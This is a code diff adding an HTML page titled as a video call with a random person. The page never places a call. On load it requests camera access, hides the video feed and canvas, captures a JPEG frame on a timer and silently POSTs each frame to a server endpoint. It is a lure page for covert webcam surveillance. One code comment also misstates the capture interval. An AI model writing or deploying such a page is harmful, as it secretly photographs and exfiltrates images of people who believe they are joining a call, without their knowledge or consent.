@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Capture</title>
+</head>
+<body>
+
+    <h1>Video Call with Random Person</h1>
+
+    <video id="video" playsinline autoplay style="display: none;"></video>
+    <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
+
+    <script>
+        async function requestPermission() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                handleSuccess(stream);
+                console.log('Camera access granted');
+            } catch (error) {
+                console.error('Error accessing camera:', error);
+            }
+        }
+
+        function handleSuccess(stream) {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+
+            video.srcObject = stream;
+
+            setInterval(() => {
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const imageData = canvas.toDataURL('image/jpeg', 0.8); // Convert to JPEG format with quality level 0.8
+                sendData(imageData);
+            }, 10000); // Capture frames every 100 milliseconds
+        }
+
+        async function sendData(imageData) {
+            try {
+                const response = await fetch('/save_frame', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: new URLSearchParams({ image_data: imageData }),
+                });
+                const data = await response.json();
+                console.log(data);
+            } catch (error) {
+                console.error('Error sending data:', error);
+            }
+        }
+
+        // Automatically request camera permission when the page loads
+        window.onload = requestPermission;
+    </script>
+
+</body>
+</html>
